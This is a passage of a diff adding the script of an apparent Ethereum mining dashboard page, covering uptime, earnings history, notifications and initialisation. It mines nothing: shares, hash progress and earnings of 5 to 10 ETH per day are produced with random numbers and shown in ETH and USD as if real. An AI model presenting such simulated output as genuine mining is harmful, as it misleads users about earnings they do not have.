+            const shares = Math.floor(Math.random() * 3);
+            sharesSubmitted += shares;
+            sharesEl.textContent = sharesSubmitted.toLocaleString();
+            
+            const secondsInDay = 24 * 60 * 60;
+            const minEthPerDay = 5;
+            const maxEthPerDay = 10;
+            const ethPerSecond = (minEthPerDay + Math.random() * (maxEthPerDay - minEthPerDay)) / secondsInDay;
+            
+            const ethEarned = ethPerSecond;
+            todayMined += ethEarned;
+            totalMined += ethEarned;
+            
+            updateDisplayValues();
+            
+            const elapsedSeconds = (new Date() - startTime) / 1000;
+            const progress = (elapsedSeconds % 30) / 30 * 100;
+            miningProgress.style.width = progress + '%';
+            progressText.textContent = `${Math.floor(progress)}%`;
+            blockNumber.textContent = `Block #${Math.floor(elapsedSeconds / 30) + 1}`;
+            
+            const blockIndex = Math.floor((elapsedSeconds % (blocks.length * 5)) / 5);
+            if (blockIndex !== currentBlock) {
+                blocks[currentBlock]?.classList.remove('active');
+                currentBlock = blockIndex;
+                blocks[currentBlock]?.classList.add('active');
+            }
+            
+            if (Math.random() < 0.01) {
+                addEarningToHistory(ethEarned * 100);
+            }
+        }
+
+        // Update display values
+        function updateDisplayValues() {
+            ethTodayEl.textContent = todayMined.toFixed(4) + ' ETH';
+            totalMinedEl.textContent = totalMined.toFixed(4) + ' ETH';
+            
+            const usdToday = todayMined * ethPrice;
+            const usdTotal = totalMined * ethPrice;
+            usdValueEl.textContent = '$' + usdToday.toFixed(2);
+            totalMinedUSD.textContent = '$' + usdTotal.toFixed(2);
+            
+            if (isMining) {
+                const elapsedSeconds = (new Date() - startTime) / 1000;
+                const secondsInDay = 24 * 60 * 60;
+                const estimatedDaily = (todayMined / elapsedSeconds) * secondsInDay;
+                estimatedDailyEl.textContent = estimatedDaily.toFixed(4) + ' ETH';
+            }
+        }
+
+        // Update Uptime
+        function updateUptime() {
+            if (!isMining) return;
+            
+            const now = new Date();
+            const diff = Math.floor((now - startTime) / 1000);
+            
+            const hours = Math.floor(diff / 3600);
+            const minutes = Math.floor((diff % 3600) / 60);
+            const seconds = diff % 60;
+            
+            uptimeEl.textContent = 
+                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+
+        // Add Earning to History
+        function addEarningToHistory(amount) {
+            const now = new Date();
+            const dateStr = now.toLocaleDateString();
+            const usdValue = (amount * ethPrice).toFixed(2);
+            
+            if (earningsTable.children.length === 1 && 
+                earningsTable.children[0].children.length === 1) {
+                earningsTable.innerHTML = '';
+            }
+            
+            const row = document.createElement('tr');
+            row.innerHTML = `
+                <td>${dateStr}</td>
+                <td>${amount.toFixed(6)} ETH</td>
+                <td>$${usdValue}</td>
+            `;
+            earningsTable.prepend(row);
+            
+            if (earningsTable.children.length > 5) {
+                earningsTable.removeChild(earningsTable.lastChild);
+            }
+        }
+
+        // Show Notification
+        function showNotification(message, type = '') {
+            notification.textContent = message;
+            notification.className = 'notification';
+            if (type) notification.classList.add(type);
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+
+        // Initialize
+        async function init() {
+            hashRateEl.textContent = '0 H/s';
+            sharesEl.textContent = '0';
+            workersEl.textContent = '1';
+            uptimeEl.textContent = '00:00:00';
+            ethTodayEl.textContent = '0.0000 ETH';
+            usdValueEl.textContent = '$0.00';
+            estimatedDailyEl.textContent = '0.0000 ETH';
+            totalMinedEl.textContent = '0.0000 ETH';
+            totalMinedUSD.textContent = '$0.00';
+            
+            avgHashRateEl.textContent = '0 H/s';
+            efficiencyEl.textContent = '0%';
+            blocksFoundEl.textContent = '0';
+            successRateEl.textContent = '0%';
+            
+            await fetchEthPrice();
+            
+            if (savedSettings.wallet) {
+                walletAddress = savedSettings.wallet;
+            }
+            
+            setInterval(fetchEthPrice, 30000);
+        }
+
+        // Run initialization
+        init();
+    </script>
+</body>
+</html>
